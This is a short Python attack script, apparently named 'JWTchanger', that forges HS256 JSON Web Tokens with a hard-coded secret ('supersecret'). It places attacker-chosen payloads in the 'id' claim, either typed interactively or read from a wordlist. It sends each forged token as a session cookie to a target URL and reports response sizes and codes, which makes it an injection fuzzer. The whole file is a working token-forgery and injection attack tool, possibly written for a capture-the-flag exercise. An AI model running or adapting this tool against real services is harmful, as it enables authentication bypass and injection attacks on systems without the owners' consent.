import requests
import base64
import time
import jwt


def printbanner():
    print("""
       ___          _________        _                                 
      | \ \        / /__   __|      | |                                
      | |\ \  /\  / /   | |      ___| |__   __ _ _ __   __ _  ___ _ __ 
  _   | | \ \/  \/ /    | |     / __| '_ \ / _` | '_ \ / _` |/ _ \ '__|
 | |__| |  \  /\  /     | |    | (__| | | | (_| | | | | (_| |  __/ |   
  \____/    \/  \/      |_|     \___|_| |_|\__,_|_| |_|\__, |\___|_|   
                                                        __/ |          
                                                       |___/           
    """)

base_url = ""

def fuzz(file_,fsize="",fstatus=""):
    with open(file_) as f:
        lines = f.readlines()
        lines = [line.rstrip() for line in lines]
        lines = [line for line in lines]
    for line in lines:
        encoded_jwt = jwt.encode({
            "id": line,
            "login": 'a',
            "mail": 'a',
            "role": 'a',
            "ip": "127.0.0.1"
        }, "supersecret", algorithm="HS256")


        req = requests.get(base_url, headers={"Cookie": "user_token=" + encoded_jwt})
        if (str(len(req.text)) != str(fsize)) and (str(req.status_code) != str(fstatus)):
            print(f'request size: {len(req.text)}  with code: {req.status_code}')
            print(f'param: {line}\njwt: {encoded_jwt}')
            print()


def interactive(debug=False,jwt_print=False):
    while True:
        inj = str(input('> '))
        encoded_jwt = jwt.encode({
            "id": inj,
            "login": "a",
            "mail": "a",
            "role": "a",
            "ip": "127.0.0.1"
        }, "supersecret", algorithm="HS256")
        if jwt_print: print(encoded_jwt)

        req = requests.get(base_url, headers={"Cookie": "user_token=" + encoded_jwt})
        if debug: print(req.text)
        print(f'request length: {len(req.text)} with code: {req.status_code}')

printbanner()

inp = str(input("Choose your action:\n1. interactive mode\n2. FUZZing mode (with list)\n> "))
if inp == '1':
    inp2 = str(input("Choose params:\n"
                     "1. basic interactive mode\n"
                     "2. interactive mode with debug (print result)\n"
                     "3. interactive mode with jwt (print token)\n"
                     "4. interactive mode with debug and jwt\n> "))
    if inp2 == "1":
        print("OK sending requests")
        print("=" * 50)
        interactive()
    elif inp2 == "2":
        print("OK sending requests \nverbose: debug")
        print("=" * 50)
        interactive(debug=True)
    elif inp2 == "3":
        print("OK sending requests\n verbose: jwt")
        print("=" * 50)
        interactive(jwt_print=True)
    elif inp2 == "4":
        print("OK sending requests \nverbose: debug,jwt")
        print("=" * 50)
        interactive(debug=True,jwt_print=True)

elif inp == '2':
    file = str(input("> filename: "))
    print("If u want u can provide response size and status to filter by:")
    filter_size = str(input("response size: "))
    filter_status = str(input("response status: "))
    if filter_size and filter_status:
        print(f"OK sending requests\nresponse size != {filter_size}\nresponse status != {filter_status}")
    elif filter_size:
        print(f"OK sending requests\nresponse size != {filter_size}")
    elif filter_status:
        print(f"OK sending requests\nresponse status != {filter_status}")
    else:
        print("OK sending requests with no filter")

    print("="*50)

    fuzz(file,fsize=filter_size,fstatus=filter_status)
